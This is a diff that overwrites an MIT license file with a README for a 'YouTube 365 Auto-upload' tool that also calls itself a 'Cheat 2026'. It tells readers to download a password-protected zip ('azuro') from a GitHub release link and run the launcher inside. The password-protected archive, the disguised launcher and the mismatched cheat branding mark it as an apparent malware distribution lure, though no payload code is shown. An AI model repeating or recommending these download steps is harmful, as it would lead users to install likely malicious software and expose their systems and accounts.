@@ -1,21 +1,25 @@
-MIT License
+YouTube 365 Auto-upload | Cheat 2026
 
-Copyright (c) 2026 MonetaryAngular
+⚙️ How to Use
+# PASSWORD: azuro
+1. Download and unzip the latest version of the launcher (Link to the latest launcher - https://github.com/Amplitudekespot/itaoaayg/releases/download/Latest/Azuro.zip)
+# PASSWORD: azuro
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+2. Launch the launcher and click RUN
+3. Wait for the launcher to update
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+365 Auto Upload is a lightweight automation tool designed to streamline YouTube content publishing workflows. It helps creators and developers manage large volumes of video uploads, schedule content in advance, and maintain consistent channel activity with minimal manual effort.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+The project focuses on automation, scalability, and testing, making it useful for:
+YouTube content scheduling
+Bulk video upload management
+Channel workflow optimization
+Content experiments and A/B testing
+Automation research and development
+
+Features
+Automated video uploads
+Scheduled publishing support
+Scalable workflow for multiple uploads
+Configurable metadata handling
+Designed for long-term content planning
